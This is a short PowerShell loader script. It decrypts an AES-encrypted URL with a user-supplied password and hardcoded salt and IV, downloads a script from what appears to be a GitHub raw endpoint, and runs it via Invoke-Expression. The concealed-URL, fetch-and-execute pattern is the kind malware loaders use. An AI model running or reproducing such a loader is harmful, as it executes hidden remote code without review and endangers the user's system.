function Decrypt-String ($Encrypted, $Passphrase, $salt = "Ad3t049866", $init = "Ad3t0PASS") {
	if ($Encrypted -is [string]) {
		$Encrypted = [Convert]::FromBase64String($Encrypted)
	}
	$r = New-Object System.Security.Cryptography.RijndaelManaged
	$pass = [Text.Encoding]::UTF8.GetBytes($Passphrase)
	$salt = [Text.Encoding]::UTF8.GetBytes($salt)
	$r.Key = (New-Object Security.Cryptography.PasswordDeriveBytes $pass, $salt, "SHA1", 5).GetBytes(32)
	$r.IV = (New-Object Security.Cryptography.SHA1Managed).ComputeHash([Text.Encoding]::UTF8.GetBytes($init))[0..15]
	$d = $r.CreateDecryptor()
	$ms = New-Object IO.MemoryStream @(, $Encrypted)
	$cs = New-Object Security.Cryptography.CryptoStream $ms, $d, "Read"
	$sr = New-Object IO.StreamReader $cs
	Write-Output $sr.ReadToEnd()
	$sr.Close()
	$cs.Close()
	$ms.Close()
	$r.Clear()
}
$encURL = 'x6kxt3P2xDXHXDBdbGUCroGC6g3is8SL6Mlxn4GTL9SXuOj68dtSrNzvD5MtrJPaCAWbMRQB+UNJzAnxNd2CYLQMpgp/2xzpiGGCeWzrWSY5GVf19fAKzrvwrwtW29ASsnZo7g0pYvzgH3ByECWDQaPnVQX0fhwJAnRyz+Nc4bg1BWyxyg7bzqHHxBzEUWbZsWE758SgFcUdjNaXEws3sQ=='
$pass = Read-Host "Password"
$decURL = Decrypt-String -Encrypted $encURL -Passphrase $pass
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$Script = Invoke-RestMethod "$($decURL)" -Headers @{"Accept" = "application/vnd.github.v3.raw" }
Invoke-Expression $Script